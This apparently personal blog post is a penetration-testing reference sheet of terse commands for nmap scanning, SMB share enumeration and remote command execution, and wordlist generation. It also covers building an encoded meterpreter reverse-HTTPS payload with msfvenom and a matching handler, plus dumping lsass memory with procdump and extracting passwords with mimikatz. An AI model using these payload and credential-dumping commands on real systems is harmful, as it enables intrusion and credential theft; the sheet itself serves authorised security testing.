---
title: 'Penetration Testing Reference Sheet'
date: '2019-02-18 16:30:24'
tags: pentesting cheatsheets
---

This post is a "living document," intended for me to keep a quick-and-dirty reference sheet around at all times, rather than as a standalone post. It will be updated with items that I find I need to refer to multiple times.

# Passive Recon
## Discover Scripts
[https://github.com/leebaird/discover](https://github.com/leebaird/discover)

# Active Network Enumeration
## Nmap
### Identifying live targets from a specific network range
`nmap -sn -oA <outputfile> <network(s)>`
### Identifying live targets from a provided host/range list
`nmap -sn -oA <outputfile> -iL <inputfile.txt>`

Note: parse output above for live hosts before port scanning to save time.
### Identifying open TCP ports
`nmap -sS -p0-65535 -oA <outputfile> -iL <inputfile>`

### Scanning for service version banners and OS fingerprinting
`nmap -sV -O -oA <outputfile> -p <ports> -iL <inputfile>`

### Scanning for common vulnerabilities
`nmap -sC --script=vuln -oA <outputfile> -p <ports> -iL <inputfile>`

## EyeWitness
### Screenshotting HTTP/S targets
`/opt/EyeWitness/EyeWitness.py --web --prepend-https -f <inputfile>`

### Screenshotting RDP targets
`/opt/EyeWitness/EyeWitness.py --rdp --ocr -f <inputfile>`

## SMBMap
### Scan for unauthenticated shares on target
`smbmap -H <target>`

### Scan for authenticated shares on target
`smbmap -H <target> -u <username> -p <password> -d <domain>`

### Execute a command via SMB
`smbmap -H <target> -u <username> -p <password> -d <domain> -x <command>`

## Cewl
### Generate word and email lists from page
`cewl -w <wordsoutputfile> -a -e --email_file <emailsoutputfile> -v <target>`

# Parsing output
## Cutting Nmap results
### Parsing live hosts from discovery scan
`grep Host <inputfile.gnmap> | cut -d" " -f 2 | sort -u > <outputfile>`

### Listing unique open ports from a previous scan
`grep syn-ack <inputfile.nmap> | cut -d/ -f 1 | sort -u > <outputfile>`

### Removing line breaks and inserting commas for Nmap port specification
`sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' < <inputfile>`

# Automation
## Bash
### Repeat command for each line of a file
`while read ip; do <command> "$ip"; done < <inputfile>`

Good for automating commands that only accept one target.

### Save command output to file
`<command> | tee <outputfile>`

Useful for tools that don't have a logging feature, e.g. SMBMap.

### Rename multiple files in a folder while keeping their extension
``` bash
a=1
for i in *.ext; do
  num=$(printf "%04d.ext" "$a")
  mv -i -- "$i" "<prefix>-$(date +%Y-%m-%d)-$num"
  let a=a+1
done
```

Useful date/time variables to include in file names:
$(date +%Y-%m-%d-%H-%M-%S)


## Windows CLI
### Ping scan /24 range via loop
`FOR /L %i in (1,1,255) do @ping -n 1 <prefix>.%i | find "Reply"`

# Python virtual environments
## Install virtualenv
`pip install virtualenv`

## Create a new virtualenv
`virtualenv <directory>`

## Use an existing virtualenv
`source <directory>/bin/activate`

## Exit currently active virtualenv
`deactivate`

# Wordlists
## Kali built-in
~~~ bash
/usr/share/wordlists/
├── dirb -> /usr/share/dirb/wordlists
├── dirbuster -> /usr/share/dirbuster/wordlists
├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
├── metasploit -> /usr/share/metasploit-framework/data/wordlists
├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt.gz
├── sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
└── wfuzz -> /usr/share/wfuzz/wordlist
~~~

## Seclists
[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

# Generating exploit payloads
## Veil (the newer way)
[https://github.com/Veil-Framework/](https://github.com/Veil-Framework/)

## MSFVenom (the old way)
### Generating a typical payload
`msfvenom -f exe -e x86/shikata_ga_nai -a x64 -p windows/x64/meterpreter_reverse_https lhost=<ip> lport=<port>  -i <count> -o <outputfile>`

There are numerous ways to generate payloads.

## MSFConsole
### Creating a handler for the above payload
```
msfconsole
set payload windows/x64/meterpreter_reverse_https
set LHOST <ip>
set LPORT <port>
```

Settings for the handlers must match those of the payload.

# Post-exploitation

## Windows

### System/context Enumeration
`whoami`

`hostname`

`ipconfig /displaydns`

### Service enumeration
`net start`

### Service manipulation

`net stop <servicename>`

`net start <servicename>`

`sc stop <servicename>`

`sc start <servicename>`

### ARP cache enumeration
`arp -a`

### Credential gathering
#### Procdump
`procdump[64].exe -accepteula -ma lsass.exe <outputfile>`

Save the output file for parsing offline with mimikatz.

#### Mimikatz
`privilege::debug`

`sekurlsa::logonPasswords full`

More to come...
